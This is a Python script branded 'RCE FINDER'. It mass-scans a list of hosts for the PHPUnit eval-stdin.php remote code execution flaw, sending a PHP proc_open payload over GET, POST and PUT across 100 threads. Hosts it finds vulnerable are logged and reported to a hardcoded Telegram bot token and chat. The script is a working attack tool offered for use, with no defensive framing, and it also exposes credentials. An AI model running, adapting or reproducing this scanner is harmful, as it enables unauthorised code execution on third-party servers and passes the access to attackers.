import os
import requests
import random
import time
import sys
import urllib3
from multiprocessing.dummy import Pool
from colorama import Fore, Style, init
import certifi
bot_token = "7842480126:AAHMGxk9z4VEA1JyHxYF4m2yKD29VWQgFhc"
chat_id = "-1002427506224"

init(autoreset=True)

# Colorama for colored terminal output
fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW
fw = Fore.WHITE
clear = Style.RESET_ALL

# Create result directory if not exists
def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

Folder('result')

urllib3.disable_warnings()

# Session initialization
x = requests.session()

# Read target list from file
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit(f'\n  [!] python3 {path[len(path)-1]} list.txt')

# Define headers to be used in requests
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
}

def send_to_telegram_and_save(url):
    message = f"Vulnerable URL found: {url}"
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"

    with open("result/eval-stdin.txt", "a") as result_file:
        result_file.write(f"{url}\n")

    try:
        requests.get(telegram_url)
    except Exception as e:
        print(f"Failed to send api: {str(e)}")

# Exploit function to test GET, POST, PUT methods
def exploit_site(url):
    try:
        methods = ["get", "post", "put"]
        protocols = ["http://", "https://"]

        for protocol in protocols:
            full_url = protocol + url if not url.startswith(("http://", "https://")) else url

            for method in methods:
                # Directly try the URL without checking if blank
                data = "<?php $sp2b9876 = proc_open('uname -a', array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'r')), $sp71a4e7); echo stream_get_contents($sp71a4e7[1]);?>"

                try:
                    response = requests.request(
                        method=method,
                        url=full_url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                        data=data,
                        verify=False,  # Use False to ignore SSL verification
                        timeout=60,
                        allow_redirects=False,
                        headers=headers,
                    )

                    # Save the vulnerable URL if response contains "GNU/Linux"
                    if "GNU/Linux" in response.text:
                        print(f"{fg}Vulnerable --> {full_url} --> {method.upper()} [DONE]{clear}")
                        # Save the vulnerable URL and notify via Telegram
                        send_to_telegram_and_save(full_url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
                        return  # Stop after saving and notifying this vulnerable URL
                    else:
                        print(f"{fr}Not Vuln --> {full_url} --> {method.upper()}{clear}")

                except Exception as e:
                    print(f"{fr}Error --> {full_url} --> {method.upper()} --> {str(e)}{clear}")

    except Exception as e:
        print(f"{fr}Error --> {url} --> {str(e)} [No Response]{clear}")

def exploit(i):
    exploit_site(i)

# Main program starts here
if __name__ == "__main__":
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    banner = """
|---------------------------|
|                           |
|         RCE FINDER        |
|                           |
|---------------------------|          
    """
    for line in banner.split("\n"):
        sys.stdout.write(f" \x1b[1;{random.choice(colors)}m{line}{clear}\n")
        time.sleep(0.05)

    # Pooling with 100 threads (adjust if necessary)
    p = Pool(100)
    p.map(exploit, target)
    p.close()
    p.join()

    print(fr + "|---------------------------------------------------------|")
    print(fr + "|             " + fw + "DONE MASZEH" + fr + "                     |")
    print(fr + "|---------------------------------------------------------|")
    print(fr + "|                                                         |")
    print(fr + "|                                                         |")
    print(fr + "|       " + fw + "Auto" + fr + "}{"+ fw + "AhmadKebab" + fr + "       |")
    print(fr + "|     " + fw + "Powered by Madz" + fr + "}{"+ fw + "SIP" + fr + "       |")
    print(fr + "|                                                         |")
    print(fr + "|                                                         |")
    print(fr + "|---------------------------------------------------------|")
